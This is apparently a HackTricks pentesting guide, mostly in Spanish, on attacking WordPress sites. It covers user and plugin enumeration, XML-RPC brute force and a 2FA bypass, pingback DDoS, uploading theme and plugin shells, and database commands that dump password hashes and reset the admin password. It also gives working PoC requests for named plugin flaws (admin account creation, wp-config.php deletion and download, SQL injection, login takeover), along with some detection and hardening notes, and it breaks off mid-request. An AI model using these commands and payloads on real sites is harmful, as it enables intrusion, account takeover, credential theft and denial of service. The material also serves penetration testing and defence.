# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Información básica

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** you can find the root password of the database.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` contains useful information such as the version WordPress installed.
- `wp-activate.php` is used for the email activation process when setting up a new WordPress site.
- Login folders (may be renamed to hide it):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- The `wp-content` folder is the main directory where plugins and themes are stored.
- `wp-content/uploads/` Is the directory where any files uploaded to the platform are stored.
- `wp-includes/` This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.
- `wp-sitemap.xml` In Wordpress versions 5.5 and greater, Worpress generates a sitemap XML file with all public posts and publicly queryable post types and taxonomies.

**Post exploitation**

- The `wp-config.php` file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.

### Permisos de usuarios

- **Administrator**
- **Editor**: Publica y gestiona sus propias entradas y las de otros
- **Author**: Publica y gestiona sus propias entradas
- **Contributor**: Escribe y gestiona sus entradas pero no puede publicarlas
- **Subscriber**: Visualiza posts y edita su perfil

## **Enumeración pasiva**

### **Obtener versión de WordPress**

Check if you can find the files `/license.txt` or `/readme.html`

Inside the **source code** of the page (example from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Archivos de enlace CSS

![](<../../images/image (533).png>)

- Archivos JavaScript

![](<../../images/image (524).png>)

### Obtener Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obtener temas
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraer versiones en general
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Enumeración activa

### Plugins y Temas

Probablemente no podrás encontrar todos los Plugins y Temas posibles. Para descubrirlos todos, necesitarás **Brute Force activamente una lista de Plugins y Temas** (esperemos que existan herramientas automatizadas que contengan estas listas).

### Usuarios

- **ID Brute:** Obtienes usuarios válidos de un sitio WordPress mediante Brute Forcing de los IDs de usuario:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Si las respuestas son **200** o **30X**, eso significa que el id es **válido**. Si la respuesta es **400**, entonces el id es **inválido**.

- **wp-json:** También puedes intentar obtener información sobre los usuarios consultando:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Otro endpoint `/wp-json/` que puede revelar información sobre usuarios es:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Ten en cuenta que este endpoint solo expone usuarios que han hecho una publicación. **Solo se proporcionará información sobre los usuarios que tengan esta característica habilitada**.

También ten en cuenta que **/wp-json/wp/v2/pages** podría leak direcciones IP.

- **Login username enumeration**: Al iniciar sesión en **`/wp-login.php`** el **mensaje** es **diferente** según si el usuario indicado **existe o no**.

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Para ver si está activo intenta acceder a _**/xmlrpc.php**_ y envía esta solicitud:

**Comprobar**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Bruteforce de credenciales**

**`wp.getUserBlogs`**, **`wp.getCategories`** o **`metaWeblog.getUsersBlogs`** son algunos de los métodos que pueden usarse para brute-force credenciales. Si puedes encontrar alguno de ellos puedes enviar algo como:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
El mensaje _"Incorrect username or password"_ dentro de una respuesta con código 200 debe aparecer si las credenciales no son válidas.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Con las credenciales correctas puedes subir un archivo. En la respuesta aparecerá la ruta ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
También existe una **manera más rápida** de brute-force credenciales usando **`system.multicall`** ya que puedes probar varias credenciales en la misma petición:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Este método está pensado para programas y no para humanos, y es antiguo, por lo tanto no soporta 2FA. Así que, si tienes creds válidas pero la entrada principal está protegida por 2FA, **podrías abusar de xmlrpc.php para iniciar sesión con esas creds saltándote 2FA**. Ten en cuenta que no podrás realizar todas las acciones que puedes hacer desde la consola, pero aún podrías llegar a RCE como lo explica Ippsec en [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Si puedes encontrar el método _**pingback.ping**_ dentro de la lista puedes hacer que Wordpress envíe una petición arbitraria a cualquier host/puerto.\
Esto puede usarse para pedir a **miles** de **Wordpress** **sitios** que **accedan** a una **ubicación** (provocando así un **DDoS** en esa ubicación) o puedes usarlo para hacer que **Wordpress** escanee alguna **red** interna (puedes indicar cualquier puerto).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si obtienes **faultCode** con un valor **mayor** que **0** (17), significa que el puerto está abierto.

Consulta el uso de **`system.multicall`** en la sección anterior para aprender cómo abusar de este método y provocar DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Este archivo suele existir en la raíz del sitio Wordpress: **`/wp-cron.php`**\
Cuando se **accede** a este archivo se ejecuta una consulta MySQL **pesada**, por lo que podría ser utilizada por **attackers** para **causar** un **DoS**.\
Además, por defecto, `wp-cron.php` se llama en cada carga de página (cada vez que un client solicita cualquier página de Wordpress), lo que en sitios con alto tráfico puede causar problemas (DoS).

Se recomienda deshabilitar Wp-Cron y crear un cronjob real en el host que ejecute las acciones necesarias a intervalos regulares (sin causar problemas).

### /wp-json/oembed/1.0/proxy - SSRF

Prueba a acceder a _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ y el sitio Worpress puede realizar una petición hacia ti.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Esta herramienta comprueba si existe **methodName: pingback.ping** y la ruta **/wp-json/oembed/1.0/proxy**; si existen, intenta explotarlos.

## Herramientas automáticas
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obtener acceso sobrescribiendo un bit

Más que un ataque real, esto es una curiosidad. En el CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) podías invertir 1 bit de cualquier archivo de wordpress. Así, podías invertir la posición `5389` del archivo `/var/www/html/wp-includes/user.php` para convertir en NOP la operación NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modificando un php del theme usado (se necesitan credenciales admin)**

Appearance → Theme Editor → 404 Template (a la derecha)

Cambia el contenido por un php shell:

![](<../../images/image (384).png>)

Busca en Internet cómo puedes acceder a esa página actualizada. En este caso tienes que acceder aquí: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Puedes usar:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
para obtener una sesión.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
Create your php backdoor using for example:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Este método implica la instalación de un plugin malicioso conocido por ser vulnerable y que puede explotarse para obtener un web shell. Este proceso se lleva a cabo a través del dashboard de WordPress de la siguiente manera:

1. **Adquisición del plugin**: El plugin se obtiene de una fuente como Exploit DB como [**here**](https://www.exploit-db.com/exploits/36374).
2. **Instalación del plugin**:
- Navega al dashboard de WordPress, luego ve a `Dashboard > Plugins > Upload Plugin`.
- Sube el archivo zip del plugin descargado.
3. **Activación del plugin**: Una vez que el plugin se instala correctamente, debe activarse desde el dashboard.
4. **Explotación**:
- Con el plugin "reflex-gallery" instalado y activado, puede explotarse ya que es conocido por ser vulnerable.
- El framework Metasploit proporciona un exploit para esta vulnerabilidad. Cargando el módulo apropiado y ejecutando comandos específicos, puede establecerse una sesión meterpreter, otorgando acceso no autorizado al sitio.
- Se señala que este es solo uno de los muchos métodos para explotar un sitio WordPress.

El contenido incluye ayudas visuales que muestran los pasos en el dashboard de WordPress para instalar y activar el plugin. Sin embargo, es importante señalar que explotar vulnerabilidades de esta manera es ilegal y poco ético sin la debida autorización. Esta información debe usarse de forma responsable y solo en un contexto legal, como pruebas de penetración con permiso explícito.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ es un script diseñado para escalar una vulnerabilidad de **Cross-Site Scripting (XSS)** a **Remote Code Execution (RCE)** u otras vulnerabilidades críticas en WordPress. Para más info revisa [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Proporciona **soporte para Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Crea un usuario en WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Sube tu plugin personalizado (backdoor) a WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edita un Built-In Plugin en WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edita un Built-In Theme en WordPress.
- _**(Custom) Custom Exploits:**_ Exploits personalizados para plugins/temas de terceros de WordPress.

## Post Exploitation

Extraer nombres de usuario y contraseñas:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Cambiar la contraseña del admin:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Saber cómo un plugin de Wordpress puede exponer funcionalidades es clave para encontrar vulnerabilidades en su funcionamiento. Puedes ver cómo un plugin podría exponer funcionalidad en los siguientes puntos y algunos ejemplos de plugins vulnerables en [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Una de las maneras en que un plugin puede exponer funciones a usuarios es a través de manejadores AJAX. Estos pueden contener fallos de lógica, autorización o autenticación. Además, es bastante frecuente que estas funciones basen tanto la autenticación como la autorización en la existencia de un wordpress nonce que **cualquier usuario autenticado en la instancia de Wordpress podría tener** (independientemente de su rol).

Estas son las funciones que pueden usarse para exponer una función en un plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**El uso de `nopriv` hace que el endpoint sea accesible por cualquier usuario (incluso usuarios no autenticados).**

> [!CAUTION]
> Además, si la función solo está comprobando la autorización del usuario con la función `wp_verify_nonce`, esta función solo verifica que el usuario ha iniciado sesión; normalmente no comprueba el rol del usuario. Por lo tanto, usuarios de bajo privilegio podrían tener acceso a acciones de alto privilegio.

- **REST API**

También es posible exponer funciones en wordpress registrando una REST API usando la función `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
El `permission_callback` es una función callback que comprueba si un usuario dado está autorizado para invocar el método de la API.

**Si se usa la función integrada `__return_true`, simplemente omitirá la comprobación de permisos del usuario.**

- **Acceso directo al archivo PHP**

Por supuesto, Wordpress usa PHP y los archivos dentro de los plugins son directamente accesibles desde la web. Por lo tanto, si un plugin expone alguna funcionalidad vulnerable que se activa simplemente accediendo al archivo, será explotable por cualquier usuario.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Algunos plugins implementan atajos de “trusted header” para integraciones internas o reverse proxies y luego usan ese header para establecer el contexto de usuario actual en las peticiones REST. Si el header no está ligado criptográficamente a la petición por un componente upstream, un atacante puede spoofearlo y acceder a rutas REST privilegiadas como administrador.

- Impacto: unauthenticated privilege escalation a admin al crear un nuevo administrador vía la core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (fuerza el user ID 1, típicamente la primera cuenta de administrador).
- Exploited route: `POST /wp-json/wp/v2/users` con un elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Por qué funciona

- El plugin mapea un header controlado por el cliente al estado de autenticación y omite las comprobaciones de capacidades.
- WordPress core espera la capacidad `create_users` para esta ruta; el hack del plugin la evita estableciendo directamente el contexto del usuario actual desde el header.

Indicadores de éxito esperados

- HTTP 201 con un cuerpo JSON describiendo el usuario creado.
- Un nuevo usuario admin visible en `wp-admin/users.php`.

Lista de verificación de detección

- Grep por `getallheaders()`, `$_SERVER['HTTP_...']`, o vendor SDKs que leen headers personalizados para establecer el contexto de usuario (p. ej., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revisar las registraciones de REST en busca de callbacks privilegiados que carecen de comprobaciones robustas de `permission_callback` y en su lugar dependen de headers de la petición.
- Buscar usos de funciones core de gestión de usuarios (`wp_insert_user`, `wp_create_user`) dentro de handlers REST que están condicionados únicamente por valores de headers.

### Eliminación arbitraria de archivos sin autenticar vía wp_ajax_nopriv (Litho Theme <= 3.0)

Los temas y plugins de WordPress frecuentemente exponen handlers AJAX a través de los hooks `wp_ajax_` y `wp_ajax_nopriv_`. Cuando se usa la variante **_nopriv_** **el callback se vuelve accesible por visitantes no autenticados**, por lo que cualquier acción sensible debe además implementar:

1. Una **comprobación de capacidades** (p. ej. `current_user_can()` o al menos `is_user_logged_in()`), y
2. Un **nonce CSRF** validado con `check_ajax_referer()` / `wp_verify_nonce()`, y
3. **Saneamiento / validación estricta de entradas**.

El theme multipropósito Litho (< 3.1) olvidó esos 3 controles en la funcionalidad *Remove Font Family* y terminó incluyendo el siguiente código (simplificado):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemas introducidos por este fragmento:

* **Acceso no autenticado** – se registra el hook `wp_ajax_nopriv_`.
* **Sin comprobación de nonce / capability** – cualquier visitante puede acceder al endpoint.
* **Sin sanitización de ruta** – la cadena controlada por el usuario `fontfamily` se concatena a una ruta de sistema de archivos sin filtrado, permitiendo el clásico `../../` traversal.

#### Explotación

Un atacante puede eliminar cualquier archivo o directorio **debajo del directorio base de uploads** (normalmente `<wp-root>/wp-content/uploads/`) enviando una única solicitud HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *asistente de instalación* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Lista de verificación de detección

* Any `add_action( 'wp_ajax_nopriv_...')` callback that calls filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenation of unsanitised user input into paths (look for `$_POST`, `$_GET`, `$_REQUEST`).
* Absence of `check_ajax_referer()` and `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation vía restauración de roles obsoletos y autorización faltante (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

A real-world example was found in the Admin and Site Enhancements (ASE) plugin (≤ 7.6.2.1). The reset branch restored roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`, but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding the saved roles from user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Por qué es explotable

- Confía en `$_REQUEST['reset-for']` y en una opción del plugin sin autorización del lado del servidor.
- Si un usuario previamente tenía privilegios más altos guardados en `_asenha_view_admin_as_original_roles` y fue degradado, puede restaurarlos accediendo a la ruta de reset.
- En algunas implementaciones, cualquier usuario autenticado podría desencadenar un reset para otro nombre de usuario aún presente en `viewing_admin_as_role_are` (autorización rota).

Explotación (ejemplo)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
En versiones vulnerables esto elimina los roles actuales y vuelve a añadir los roles originales guardados (p. ej., `administrator`), escalando efectivamente privilegios.

Lista de comprobación de detección

- Buscar funciones de cambio de rol que persistan “original roles” en user meta (p. ej., `_asenha_view_admin_as_original_roles`).
- Identificar rutas de restablecimiento/recuperación que:
  - Lean nombres de usuario desde `$_REQUEST` / `$_GET` / `$_POST`.
  - Modifiquen roles vía `add_role()` / `remove_role()` sin `current_user_can()` y `wp_verify_nonce()` / `check_admin_referer()`.
  - Autoricen basándose en un array de opciones del plugin (p. ej., `viewing_admin_as_role_are`) en lugar de las capacidades del actor.

---

### Escalada de privilegios no autenticada vía cambio de usuario confiando en cookie en init público (Service Finder “sf-booking”)

Algunos plugins enganchan helpers de cambio de usuario al hook público `init` y derivan la identidad de una cookie controlada por el cliente. Si el código llama a `wp_set_auth_cookie()` sin verificar la autenticación, las capacidades y un nonce válido, cualquier visitante no autenticado puede forzar el login como un ID de usuario arbitrario.

Patrón vulnerable típico (simplificado de Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Por qué es explotable

- El hook público `init` hace que el manejador sea accesible por usuarios no autenticados (sin la comprobación `is_user_logged_in()`).
- La identidad se deriva de una cookie modificable por el cliente (`original_user_id`).
- La llamada directa a `wp_set_auth_cookie($uid)` inicia sesión al solicitante como ese usuario sin ninguna comprobación de capacidades/nonce.

Explotación (sin autenticación)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Consideraciones de WAF para CVEs de WordPress/plugin

Los WAFs genéricos en edge/servidor están ajustados para patrones amplios (SQLi, XSS, LFI). Muchas vulnerabilidades de alto impacto en WordPress/plugin son fallos de lógica/`auth` específicos de la aplicación que parecen tráfico benigno a menos que el motor entienda las rutas de WordPress y la semántica del plugin.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- No confíes en firmas genéricas de WAF para proteger CVEs de plugins. Implementa parches virtuales específicos para la vulnerabilidad a nivel de aplicación o actualiza rápidamente.
- Prefiere controles de seguridad de tipo positivo en el código (capabilities, nonces, strict input validation) en vez de filtros regex negativos.

## WordPress Protection

### Regular Updates

Asegúrate de que WordPress, plugins y themes estén actualizados. También confirma que las actualizaciones automáticas estén habilitadas en wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Además, **solo instala plugins y temas confiables de WordPress**.

### Plugins de seguridad

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Otras recomendaciones**

- Elimina el usuario por defecto **admin**
- Usa **contraseñas fuertes** y **2FA**
- Revisa periódicamente los **permisos** de los usuarios
- **Limita los intentos de login** para prevenir ataques Brute Force
- Renombra el archivo `wp-admin.php` y permite el acceso solo desde la red interna o desde ciertas direcciones IP.


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

El plugin de reclutamiento WP Job Portal expuso una tarea **savecategory** que finalmente ejecuta el siguiente código vulnerable dentro de `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemas introducidos por este fragmento:

1. **Entrada de usuario no saneada** – `parentid` proviene directamente de la petición HTTP.
2. **Concatenación de cadenas dentro de la cláusula WHERE** – no se usa `is_numeric()` / `esc_sql()` / sentencia preparada.
3. **Accesibilidad sin autenticar** – aunque la acción se ejecuta a través de `admin-post.php`, la única comprobación es un **CSRF nonce** (`wp_verify_nonce()`), que cualquier visitante puede obtener desde una página pública que incluya el shortcode `[wpjobportal_my_resumes]`.

#### Explotación

1. Obtén un nonce fresco:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Inyecta SQL arbitraria abusando de `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La respuesta revela el resultado de la consulta inyectada o altera la base de datos, demostrando el SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Otra tarea, **downloadcustomfile**, permitía a visitantes descargar **cualquier archivo en disco** mediante path traversal. El sink vulnerable se encuentra en `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` está controlado por el atacante y concatenado **sin sanitización**. De nuevo, la única barrera es un **CSRF nonce** que se puede obtener desde la página del CV.

#### Explotación
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
El servidor responde con el contenido de `wp-config.php`, leaking DB credentials and auth keys.

## Toma de control de cuenta sin autenticación vía Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Muchos themes/plugins incluyen helpers de "social login" expuestos vía admin-ajax.php. Si una acción AJAX no autenticada (wp_ajax_nopriv_...) confía en identificadores proporcionados por el cliente cuando faltan los datos del proveedor y luego llama a wp_set_auth_cookie(), esto se convierte en un bypass de autenticación completo.

Patrón defectuoso típico (simplificado)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider – execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // 🔥 logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Por qué es explotable

- Alcance sin autenticación a través de admin-ajax.php (acción wp_ajax_nopriv_…).
- No hay comprobaciones de nonce/capability antes del cambio de estado.
- Falta verificación del proveedor OAuth/OpenID; la rama por defecto acepta la entrada del atacante.
- get_user_by('email', $_POST['id']) seguido de wp_set_auth_cookie($uid) autentica al solicitante como cualquier dirección de correo electrónico existente.

Explotación (sin autenticación)

- Requisitos previos: el atacante puede alcanzar /wp-admin/admin-ajax.php y conoce/adivina un email de usuario válido.
- Establecer provider a un valor no soportado (o omitirlo) para golpear la rama por defecto y pasar id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

